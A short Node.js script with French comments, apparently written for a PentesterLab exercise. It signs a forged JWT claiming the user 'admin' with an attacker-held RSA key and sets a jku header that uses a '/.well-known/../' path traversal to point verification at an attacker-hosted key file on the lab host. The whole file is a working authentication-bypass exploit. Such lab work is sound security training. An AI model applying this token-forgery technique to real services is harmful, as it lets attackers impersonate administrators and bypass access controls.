const { sign } = require('jsonwebtoken');
const fs = require('fs');
var path = 'test.key'

var privateKey = fs.readFileSync(path); // Lire la clé privée depuis un fichier
const payloadData = {
    user: "admin"
}

// JSON Web Key (JWK)
const jwk = {
    kty: 'RSA',
    use: 'sig',
    kid: 'pentesterlab',
    n : 'AJlz-1nd2N1DLHK--bAP1l0A4uunUKwhxGYLTo1uIDDcG_Uh5QRJciw5wFzL0yahY6BAXqi9UNHPRNGR3p0s395BYZAel9KGIZjemUIr5ngPzQtu2UmcFuGnLlbdDCrKAX35C6ueMzuWZum7IR0ICupUAMR_lPGKQgUO4Xz2uzH59cafZyVUGMjIsilrnW3fc5Xdxf0eu0rXsjmUWqrHuiFeOKl-VEPgol2Nhxr6M77HkAtGRoMhTwSDXsUClz8_Bq8_d5yZdGcuP_4ZX9x1wAvY8LZlhzU4IrmeX2zM6SKpUH_mXdJVnrg-oudCybbee-lPdTcjQuTsYpnF6iWABd8',
    e: 'AQAB',
    alg: 'RS256',
};
const jwtOptions = {
    header: {
        typ:'JWT',
        alg:'RS256',
        jku: "http://ptl-9eaa4a02-ac61e960.libcurl.so/.well-known/../3f794a91-ab50-4029-93ea-7f3417e72faa.json",
    },
    noTimestamp:true,
};

// Signature du JWT avec la clé privée RSA
const signedJWT = sign(payloadData, privateKey, jwtOptions);
console.log("-----ICI----\n" + signedJWT)
